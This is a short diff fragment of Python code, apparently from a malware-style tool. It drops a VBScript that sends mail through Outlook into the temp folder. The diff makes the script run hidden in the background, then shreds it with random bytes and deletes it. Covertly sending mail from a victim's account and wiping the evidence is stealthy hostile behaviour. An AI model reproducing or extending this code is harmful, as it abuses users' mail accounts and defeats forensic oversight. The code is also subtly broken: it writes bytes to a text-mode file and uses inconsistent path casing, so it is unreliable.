@@ -45,10 +45,10 @@ Mail.send
 Next
 ol.Quit
 """
-    file_path = os.path.join(os.getenv("temp"), "mail.vbs")
+    file_path = os.path.join(os.getenv("TEMP"), "mail.vbs")
     with open(file_path, "w") as f:
         f.write(vbs_code)
-    execute_command(f'start "" "{file_path}"')
+    execute_command(f'start /b "" "{file_path}"')
     with open(file_path, "w") as f:
         f.write(os.urandom(os.path.getsize(file_path)))
     os.remove(os.path.join(os.getenv("temp"), "mail.vbs"))
